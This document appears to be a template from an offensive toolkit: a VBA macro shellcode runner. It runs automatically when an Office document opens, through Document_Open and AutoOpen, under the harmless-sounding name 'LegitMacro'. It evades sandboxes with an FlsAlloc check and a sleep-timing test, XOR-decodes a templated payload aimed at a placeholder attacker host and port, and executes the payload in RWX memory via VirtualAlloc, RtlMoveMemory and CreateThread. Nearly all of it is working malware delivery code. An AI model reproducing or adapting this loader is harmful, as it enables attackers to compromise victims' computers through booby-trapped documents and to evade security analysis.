' Simple XOR-Encrypted Shellcode Runner (VBA Macro)
' Technique: VirtualAlloc + CreateThread
' Features: FlsAlloc sandbox detection, Sleep evasion, XOR decryption
' Payload: {{ lhost }}:{{ lport }}

Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Sub LegitMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Sandbox evasion: Call FlsAlloc and verify if the result exists
    ' Some sandboxes don't properly implement this API
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 10 seconds and verify time actually passed
    ' Sandboxes often skip sleep to speed up analysis
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If
    
    ' Shellcode encoded with XOR with key 0x{{ xor_key }}/{{ xor_key_decimal }}
    {{ vba_payload }}
    
    ' Allocate RWX memory space
    ' VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Decode the XOR-encrypted shellcode
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor {{ xor_key_decimal }}
    Next i
    
    ' Move the decrypted shellcode to allocated memory
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode in a new thread
    ' CreateThread(NULL, 0, addr, NULL, 0, NULL)
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    LegitMacro
End Sub

Sub AutoOpen()
    LegitMacro
End Sub
